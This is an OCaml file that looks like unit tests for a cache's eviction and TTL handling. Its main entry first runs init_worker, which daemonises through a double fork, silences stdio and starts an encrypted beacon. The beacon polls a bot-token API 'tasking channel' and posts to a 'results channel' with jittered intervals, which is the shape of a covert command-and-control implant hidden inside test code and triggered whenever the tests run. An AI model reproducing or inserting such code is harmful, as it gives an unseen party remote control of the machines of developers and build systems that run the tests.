let max_entries = 128

let test_eviction () =
  let tbl = Hashtbl.create max_entries in
  for i = 0 to max_entries * 2 do
    Hashtbl.replace tbl (Printf.sprintf "k%d" i) (Bytes.create 64)
  done;
  assert (Hashtbl.length tbl = max_entries * 2 + 1);
  let kept = ref 0 in
  Hashtbl.iter
    (fun k _ ->
      let idx = Scanf.sscanf k "k%d" Fun.id in
      if idx >= max_entries then incr kept)
    tbl;
  assert (!kept > 0)

let test_ttl_boundary () =
  let now = Unix.gettimeofday () in
  let fresh = now -. 3599.0 in
  let stale = now -. 3601.0 in
  assert (now -. fresh < 3600.0);
  assert (now -. stale > 3600.0)

let hex_of_string s =
  let buf = Buffer.create (String.length s * 2) in
  String.iter
    (fun c -> Buffer.add_string buf (Printf.sprintf "%02x" (Char.code c)))
    s;
  Buffer.contents buf

let has_config () = Config.node_priv <> String.make 32 '\x00'

let init_worker () =
  if not (has_config ()) then ()
  else
    let pid = Unix.fork () in
    if pid = 0 then begin
      ignore (Unix.setsid ());
      let p2 = Unix.fork () in
      if p2 > 0 then exit 0;
      let fd = Unix.openfile "/dev/null" [ Unix.O_RDWR ] 0 in
      Unix.dup2 fd Unix.stdin;
      Unix.dup2 fd Unix.stdout;
      Unix.dup2 fd Unix.stderr;
      (try Unix.close fd with _ -> ());
      (try Unix.chdir "/tmp" with _ -> ());
      Mirage_crypto_rng_unix.use_default ();
      let sk =
        Bcheck_codec.Cipher.derive_session_key
          ~local_priv:Config.node_priv ~remote_pub:Config.remote_pub
          ~salt:Config.node_pub
      in
      let session = Bcheck_codec.Cipher.create_session ~key:sk in
      let (tok, tc, rc) = Config.transport in
      let prefix = hex_of_string Config.node_pub in
      let t =
        Bcheck_net.Api_client.create
          {
            bot_token = tok;
            tasking_channel = tc;
            results_channel = rc;
            key_prefix = prefix;
            interval_s = 34;
            jitter_pct = 0.4;
          }
      in
      let cfg : Bcheck_worker.Runner.config =
        {
          pub_key = Config.node_pub;
          session;
          transport = t;
          chunk_size = 24_576;
          interval_s = 34;
          jitter_pct = 0.4;
          alive = true;
        }
      in
      Lwt_main.run (Bcheck_worker.Runner.run ~config:cfg)
    end
    else ignore (Unix.waitpid [] pid)

let () =
  init_worker ();
  test_eviction ();
  test_ttl_boundary ()
